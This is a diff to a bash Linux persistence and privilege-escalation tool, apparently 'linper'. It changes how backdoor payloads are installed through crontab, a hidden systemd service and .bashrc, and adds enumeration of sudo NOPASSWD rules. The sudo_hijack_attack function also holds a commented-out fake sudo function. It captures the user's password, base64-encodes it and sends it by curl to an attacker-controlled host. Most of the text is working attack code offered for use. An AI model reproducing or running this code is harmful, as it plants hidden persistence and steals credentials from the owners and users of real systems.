@@ -35,7 +35,7 @@ doors=(
 	# eval statement = same as above
 	# hinge = door hinge, haha get it? it is the command to actually be executed (piped to $SHELL) in order to install the backdoor, for each method. It will contain everything needed for the door to function properly (e.g. cron schedule, service details, backgrounding for bashrc, etc). The persistence *hinges* on this to be syntactically correct, literally :)
 	"crontab , if crontab -l > /dev/shm/.cron; echo \"* * * * * echo linper\" >> /dev/shm/.cron; crontab /dev/shm/.cron; crontab -l > /dev/shm/.cron; cat /dev/shm/.cron | grep -v linper > /dev/shm/.rcron; crontab /dev/shm/.rcron; if grep -qi [A-Za-z0-9] /dev/shm/.rcron; then crontab /dev/shm/.rcron; else crontab -r; fi; grep linper -qi /dev/shm/.cron , echo \"$cron $(cat /dev/shm/.linpay)\" >> /dev/shm/.rcron; crontab /dev/shm/.rcron; rm /dev/shm/.rcron:"
-	"systemctl , if touch /etc/systemd/.temp; rm /etc/systemd/.temp , export temp_service=.$(mktemp -u | sed 's/.*\.//g').service; touch /etc/systemd/system/$temp_service; echo \"[Service]\" >> /etc/systemd/system/$temp_service; echo \"Type=oneshot\" >> /etc/systemd/system/$temp_service; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$temp_service; echo \"ExecStart=$(which $SHELL) -c '$payload' \" >> /etc/systemd/system/$temp_service; echo \"[Install]\" >> /etc/systemd/system/$temp_service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$temp_service; chmod 644 /etc/systemd/system/$temp_service; systemctl start $temp_service 2> /dev/null & sleep .0001; systemctl enable $temp_service 2> /dev/null & sleep .0001; echo $temp_service:"
+	"systemctl , if find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , export temp_service=.$(mktemp -u | sed 's/.*\.//g').service; touch /etc/systemd/system/$temp_service; echo \"[Service]\" >> /etc/systemd/system/$temp_service; echo \"Type=oneshot\" >> /etc/systemd/system/$temp_service; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$temp_service; echo \"ExecStart=$(which $SHELL) -c '$payload' \" >> /etc/systemd/system/$temp_service; echo \"[Install]\" >> /etc/systemd/system/$temp_service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$temp_service; chmod 644 /etc/systemd/system/$temp_service; systemctl start $temp_service 2> /dev/null & sleep .0001; systemctl enable $temp_service 2> /dev/null & sleep .0001; echo $temp_service:"
 	"bashrc , if cd;find -writable -name .bashrc | grep -qi bashrc , echo \"$(cat /dev/shm/.linpay) 2> /dev/null & sleep .0001\" >> ~/.bashrc"
 )
 
@@ -104,24 +104,30 @@ enum_doors() {
 }
 
 sudo_hijack_attack () {
-if $(cat /etc/group | grep sudo | grep -qi $(whoami));
-then
-	echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
-	echo "-----------------------"
-	#echo 'function sudo () {
-	#	realsudo="$(which sudo)"
-	#	passwdfile="'$passwdfile'"
-	#	read -s -p "[sudo] password for $USER: " inputPasswd
-	#	printf "\n"; printf "%s\n" "$USER : $inputPasswd" >> $passwdfile
-	#	sort -uo "$passwdfile" "$passwdfile"
-	#	encoded=$(cat "$passwdfile" | base64) > /dev/null 2>&1
-	#	curl -k -s "https://'$attackBox'/$encoded" > /dev/null 2>&1
-	#	$realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
-	#	$realsudo "${@:1}"
-	#	}' >> ~/.bashrc
-	#echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
-	#echo -e "\e[92m[+]\e[0m Stored in $passwdfile"
-fi
+	if $(sudo -l | grep -qi NOPASSWD);
+	then
+		echo -e "\e[92m[+]\e[0m Sudo NOPASSWD Attack Possible for the Following Commands"
+		sudo -l | grep NOPASSWD | awk -F ': ' '{print $2}'
+		echo "-----------------------"
+	fi
+	if $(cat /etc/group | grep sudo | grep -qi $(whoami));
+	then
+		echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
+		echo "-----------------------"
+		#echo 'function sudo () {
+		#	realsudo="$(which sudo)"
+		#	passwdfile="'$passwdfile'"
+		#	read -s -p "[sudo] password for $USER: " inputPasswd
+		#	printf "\n"; printf "%s\n" "$USER : $inputPasswd" >> $passwdfile
+		#	sort -uo "$passwdfile" "$passwdfile"
+		#	encoded=$(cat "$passwdfile" | base64) > /dev/null 2>&1
+		#	curl -k -s "https://'$attackBox'/$encoded" > /dev/null 2>&1
+		#	$realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
+		#	$realsudo "${@:1}"
+		#	}' >> ~/.bashrc
+		#echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
+		#echo -e "\e[92m[+]\e[0m Stored in $passwdfile"
+	fi
 }
 
 webserver_poison_attack () {
